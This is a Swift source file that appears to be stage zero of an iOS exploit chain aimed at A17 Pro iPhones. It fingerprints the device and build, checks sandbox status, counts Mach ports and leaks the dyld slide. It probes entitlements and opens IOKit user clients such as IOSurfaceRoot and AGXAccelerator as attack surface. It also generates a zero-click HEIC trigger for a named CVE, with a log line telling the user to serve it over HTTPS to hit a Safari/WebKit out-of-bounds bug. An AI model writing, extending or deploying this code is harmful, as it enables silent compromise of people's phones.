import Foundation
import Darwin
import MachO

enum Stage0 {
    struct Recon {
        let iosVersion: String
        let buildNumber: String
        let model: String
        let hw_machine: String
        let containerRoot: String
        let bootstrapPort: mach_port_t
        let nameSpaceUsed: Int
        let nameSpaceBudget: Int
        let pageSize: Int
        let kernelPageSize: Int
        let passed: Bool
    }

    static func run() -> Recon {
        let log = WireLog.shared
        log.stage(0, "RECON — environment & privilege surface")

        let iosVersion = ProcessInfo.processInfo.operatingSystemVersionString
        let buildNumber = sysctl_string("kern.osversion")
        let model = sysctl_string("hw.machine")
        let hw = sysctl_string("hw.model")

        log.log("iOS: \(iosVersion)")
        log.log("build: \(buildNumber)")
        log.log("hw.machine: \(model)")
        log.log("hw.model: \(hw)")

        let isA17Pro = model.contains("iPhone16") || hw.lowercased().contains("t8130") || hw.lowercased().contains("d84")
        if isA17Pro {
            log.ok("device confirmed: A17 Pro / t8130")
        } else {
            log.warn("unexpected device: \(model) / \(hw) — chain is tuned for A17 Pro")
        }

        let container = NSHomeDirectory()
        log.log("container: \(container)")

        let pageSize = Int(vm_kernel_page_size)
        let kernPageSize = sysctl_int("hw.pagesize")
        log.log("vm page size: \(pageSize), hw.pagesize: \(kernPageSize)")

        // Mach namespace baseline
        let task = mach_task_self_
        var bsPort: mach_port_t = 0
        task_get_special_port(task, TASK_BOOTSTRAP_PORT, &bsPort)
        log.log("bootstrap port: \(bsPort)")

        // Count ports in our namespace
        var names: mach_port_name_array_t?
        var types: mach_port_type_array_t?
        var namesCnt: mach_msg_type_number_t = 0
        var typesCnt: mach_msg_type_number_t = 0
        let kr = mach_port_names(task, &names, &namesCnt, &types, &typesCnt)
        var used = 0
        if kr == KERN_SUCCESS {
            used = Int(namesCnt)
            vm_deallocate(task, vm_address_t(bitPattern: names), vm_size_t(namesCnt) * vm_size_t(MemoryLayout<mach_port_name_t>.size))
            vm_deallocate(task, vm_address_t(bitPattern: types), vm_size_t(typesCnt) * vm_size_t(MemoryLayout<mach_port_type_t>.size))
        }
        log.log("mach ports in namespace: \(used)")

        // Budget — table entries limit (default 512 for app)
        let budget = 512
        log.log("port budget (default app): \(budget)")

        // Check sandbox status
        let sbCheck = sandbox_check(getpid(), nil, UInt32(SANDBOX_CHECK_NO_REPORT))
        if sbCheck != 0 {
            log.log("sandbox: ACTIVE (expected)")
        } else {
            log.ok("sandbox: NOT ACTIVE — already escaped?")
        }

        // Check entitlements by probing protected APIs
        log.log("probing entitlement gates...")
        probeEntitlements()

        // dyld shared cache info
        let cacheSlide = _dyld_get_image_vmaddr_slide(0)
        log.data("dyld slide (image 0): 0x\(String(cacheSlide, radix: 16))")

        // HEIC zero-click initial access payload (CVE-2026-112621)
        log.log("generating zero-click HEIC trigger (CVE-2026-112621)...")
        if let trigger = HEICGenerator.generate(name: "trigger") {
            log.ok("zero-click HEIC trigger ready: \(trigger.url.path)")
            log.data("serve this file + index.html over HTTPS to trigger Safari/WebKit OOB")
        } else {
            log.warn("HEIC trigger generation failed — ImageIO path may be restricted")
        }

        let passed = true
        log.ok("stage 0 complete — baseline captured")

        return Recon(
            iosVersion: iosVersion,
            buildNumber: buildNumber,
            model: model,
            hw_machine: hw,
            containerRoot: container,
            bootstrapPort: bsPort,
            nameSpaceUsed: used,
            nameSpaceBudget: budget,
            pageSize: pageSize,
            kernelPageSize: kernPageSize,
            passed: passed
        )
    }

    private static func probeEntitlements() {
        let log = WireLog.shared

        // task_for_pid on ourselves (requires com.apple.system-task-ports or similar)
        var selfPort: mach_port_t = 0
        let kr = task_for_pid(mach_task_self_, getpid(), &selfPort)
        if kr == KERN_SUCCESS {
            log.ok("task_for_pid(self): granted — elevated entitlements!")
        } else {
            log.log("task_for_pid(self): denied (kr=\(kr)) — normal app sandbox")
        }

        // Check if we can open IOKit user clients
        let matching = IOServiceMatching("IOSurfaceRoot")
        let service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
        if service != 0 {
            log.ok("IOSurfaceRoot: reachable (service=\(service))")
            var conn: io_connect_t = 0
            let openKr = IOServiceOpen(service, mach_task_self_, 0, &conn)
            if openKr == KERN_SUCCESS {
                log.ok("IOSurfaceRoot user client: opened (conn=\(conn))")
                IOServiceClose(conn)
            } else {
                log.log("IOSurfaceRoot user client: open failed (kr=\(openKr))")
            }
            IOObjectRelease(service)
        } else {
            log.log("IOSurfaceRoot: not found")
        }

        // AGXAccelerator (GPU)
        let agxMatch = IOServiceMatching("AGXAccelerator")
        let agxSvc = IOServiceGetMatchingService(kIOMainPortDefault, agxMatch)
        if agxSvc != 0 {
            log.ok("AGXAccelerator: reachable (service=\(agxSvc))")
            var agxConn: io_connect_t = 0
            let agxKr = IOServiceOpen(agxSvc, mach_task_self_, 2, &agxConn)
            if agxKr == KERN_SUCCESS {
                log.ok("AGXDeviceUserClient type=2: opened (conn=\(agxConn))")
                IOServiceClose(agxConn)
            } else {
                log.log("AGXDeviceUserClient: open failed (kr=0x\(String(agxKr, radix: 16)))")
            }
            IOObjectRelease(agxSvc)
        }

        // AppleANE
        let aneMatch = IOServiceMatching("AppleH16ANEInterface")
        let aneSvc = IOServiceGetMatchingService(kIOMainPortDefault, aneMatch)
        if aneSvc != 0 {
            log.ok("AppleH16ANEInterface: reachable (service=\(aneSvc))")
            IOObjectRelease(aneSvc)
        } else {
            log.log("AppleH16ANEInterface: not found (may be named differently)")
        }
    }

    // MARK: - sysctl helpers

    private static func sysctl_string(_ name: String) -> String {
        var size: size_t = 0
        sysctlbyname(name, nil, &size, nil, 0)
        guard size > 0 else { return "?" }
        var buf = [CChar](repeating: 0, count: size)
        sysctlbyname(name, &buf, &size, nil, 0)
        return String(cString: buf)
    }

    private static func sysctl_int(_ name: String) -> Int {
        var val: Int = 0
        var size = MemoryLayout<Int>.size
        sysctlbyname(name, &val, &size, nil, 0)
        return val
    }
}

@_silgen_name("sandbox_check")
func sandbox_check(_ pid: pid_t, _ operation: UnsafePointer<CChar>?, _ type: UInt32) -> Int32

private let SANDBOX_CHECK_NO_REPORT: Int32 = 0x0001
